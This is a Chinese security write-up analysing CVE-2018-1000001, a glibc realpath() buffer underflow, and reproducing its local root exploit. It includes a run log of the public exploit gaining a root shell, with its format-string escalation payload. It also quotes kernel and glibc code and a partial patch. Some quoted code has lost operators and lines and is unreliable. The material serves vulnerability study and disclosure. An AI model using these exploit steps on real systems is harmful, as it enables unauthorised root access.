作者： [Firmy@青藤实验室](https://mp.weixin.qq.com/s/-FA6VFr64QsjuiGty-KpXA
"Firmy@青藤实验室")
#### 0x00 漏洞概述
libc是Linux下的ANSI C的函数库。ANSI C是基本的C语言函数库，包含了C语言最基本的库函数。
glibc 2.26版本及之前版本中的Realpath函数存在缓冲区下溢漏洞（CVE-2018-1000001）。GNU
C库没有正确处理getcwd()系统调用返回的相对路径，并且没有对缓冲区边界进行检查，造成glibc缓冲区下溢漏洞。
实验室实习生Firmy，对该漏洞进行了复现并详细分析了该漏洞。
#### 0x01 漏洞描述
该漏洞涉及到 Linux 内核的 getcwd 系统调用和 glibc 的 realpath() 函数，可以实现本地提权。漏洞产生的原因是 getcwd
系统调用在 Linux-2.6.36 版本发生的一些变化，我们知道 getcwd
用于返回当前工作目录的绝对路径，但如果当前目录不属于当前进程的根目录，即从当前根目录不能访问到该目录，如该进程使用 chroot()
设置了一个新的文件系统根目录，但没有将当前目录的根目录替换成新目录的时候，getcwd 会在返回的路径前加上
(unreachable)。通过改变当前目录到另一个挂载的用户空间，普通用户也可以完成这样的操作。然后返回的这个非绝对地址的字符串会在 realpath()
函数中发生缓冲区下溢，从而导致任意代码执行，再利用 SUID 程序即可获得目标系统上的 root 权限。
#### 0x02 漏洞复现
漏洞发现者已经公开了漏洞利用代码，需要注意的是其所支持的系统被硬编码进了利用代码中，可看情况进行修改。
EXP：
    $ gcc -g exp.c 
    $ id
    uid=999(ubuntu) gid=999(ubuntu) groups=999(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
    $ ls -l a.out 
    -rwxrwxr-x 1 ubuntu ubuntu 44152 Feb  1 03:28 a.out
    $ ./a.out 
    ./a.out: setting up environment ...
    Detected OS version: "16.04.3 LTS (Xenial Xerus)"
    ./a.out: using umount at "/bin/umount".
    No pid supplied via command line, trying to create a namespace
    CAVEAT: /proc/sys/kernel/unprivileged_userns_clone must be 1 on systems with USERNS protection.
    Namespaced filesystem created with pid 7429
    Attempting to gain root, try 1 of 10 ...
    Starting subprocess
    Stack content received, calculating next phase
    Found source address location 0x7ffc3f7bb168 pointing to target address 0x7ffc3f7bb238 with value 0x7ffc3f7bd23f, libc offset is 0x7ffc3f7bb158
    Changing return address from 0x7f24986c4830 to 0x7f2498763e00, 0x7f2498770a20
    Using escalation string %69$hn%73$hn%1$2592.2592s%70$hn%1$13280.13280s%66$hn%1$16676.16676s%68$hn%72$hn%1$6482.6482s%67$hn%1$1.1s%71$hn%1$26505.26505s%1$45382.45382s%1$s%1$s%65$hn%1$s%1$s%1$s%1$s%1$s%1$s%1$186.186s%39$hn-%35$lx-%39$lx-%64$lx-%65$lx-%66$lx-%67$lx-%68$lx-%69$lx-%70$lx-%71$lx-%78$s
    Executable now root-owned
    Cleanup completed, re-invoking binary
    /proc/self/exe: invoked as SUID, invoking shell ...
    # id
    uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),999(ubuntu)
    # ls -l a.out 
    -rwsr-xr-x 1 root root 44152 Feb  1 03:28 a.out
过程是先利用漏洞将可执行程序自己变成一个 SUID 程序，然后执行该程序即可从普通用户提权到 root 用户。
#### 0x03 漏洞分析
getcwd() 的原型如下：
    #include 
    char *getcwd(char *buf, size_t size);
它用于得到一个以 null 结尾的字符串，内容是当前进程的当前工作目录的绝对路径。并以保存到参数 buf 中的形式返回。
首先从 Linux 内核方面来看，在 2.6.36 版本的 vfs: show unreachable paths in getcwd and proc
这次提交，使得当目录不可到达时，会在返回的目录字符串前面加上 (unreachable)：
    // fs/dcache.c
    static int prepend_unreachable(char **buffer, int *buflen)
    {
        return prepend(buffer, buflen, "(unreachable)", 13);
    }
    static int prepend(char **buffer, int *buflen, const char *str, int namelen)
    {
        *buflen -= namelen;
        if (*buflen = 0)
     *            return buf;
     *        errno = -retval;
     *        return NULL;
     *    }
     */
    SYSCALL_DEFINE2(getcwd, char __user *, buf, unsigned long, size)
    {
        int error;
        struct path pwd, root;
        char *page = __getname();
        if (!page)
            return -ENOMEM;
        rcu_read_lock();
        get_fs_root_and_pwd_rcu(current->fs, &root, &pwd);
        error = -ENOENT;
        if (!d_unlinked(pwd.dentry)) {
            unsigned long len;
            char *cwd = page + PATH_MAX;
            int buflen = PATH_MAX;
            prepend(&cwd, &buflen, "\0", 1);
            error = prepend_path(&pwd, &root, &cwd, &buflen);
            rcu_read_unlock();
            if (error  0) {
                error = prepend_unreachable(&cwd, &buflen); // 当路径不可到达时，添加前缀
                if (error)
                    goto out;
            }
            error = -ERANGE;
            len = PATH_MAX + page - cwd;
            if (len  rpath + 1)
            while ((--dest)[-1] != '/');    // 回溯，如果 rpath 中没有 '/'，发生下溢出
        }
          else  // 路径组成中没有 "." 和 ".." 的情况时，复制 name 到 dest
        {
          size_t new_size;
          if (dest[-1] != '/')
            *dest++ = '/';
              [...]
        }
        }
    }
当传入的 name 不是一个绝对路径，比如 ../../x，realpath() 将会使用当前工作目录来进行解析，而且默认了它以 /
开头。解析过程是从后先前进行的，当遇到 ../ 的时候，就会跳到前一个 /，但这里存在一个问题，没有对缓冲区边界进行检查，如果缓冲区不是以 /
开头，则函数会越过缓冲区，发生溢出。所以当 getcwd 返回的是一个不可到达路径 (unreachable)/时，../../x 的第二个 ../
就已经越过了缓冲区，然后 x 会被复制到这个越界的地址处。
###### 补丁
漏洞发现者也给出了它自己的补丁，在发生溢出的地方加了一个判断，当 dest == rpath 的时候，如果 `*dest != '/'`，则说明该路径不是以
/ 开头，便触发报错。
    --- stdlib/canonicalize.c    2018-01-05 07:28:38.000000000 +0000
    +++ stdlib/canonicalize.c    2018-01-05 14:06:22.000000000 +0000
    @@ -91,6 +91,11 @@
           goto error;
         }
           dest = __rawmemchr (rpath, '\0');
    +/* If path is empty, kernel failed in some ugly way. Realpath
    +has no error code for that, so die here. Otherwise search later
    +on would cause an underrun when getcwd() returns an empty string.
    +Thanks Willy Tarreau for pointing that out. */
    +      assert (dest != rpath);
         }
       else
         {
    @@ -118,8 +123,17 @@
           else if (end - start == 2 && start[0] == '.' && start[1] == '.')
         {
           /* Back up to previous component, ignore if at root already.  */
    -      if (dest > rpath + 1)
    -        while ((--dest)[-1] != '/');
    +      dest--;
    +      while ((dest != rpath) && (*--dest != '/'));
    +      if ((dest == rpath) && (*dest != '/') {
    +        /* Return EACCES to stay compliant to current documentation:
    +        "Read or search permission was denied for a component of the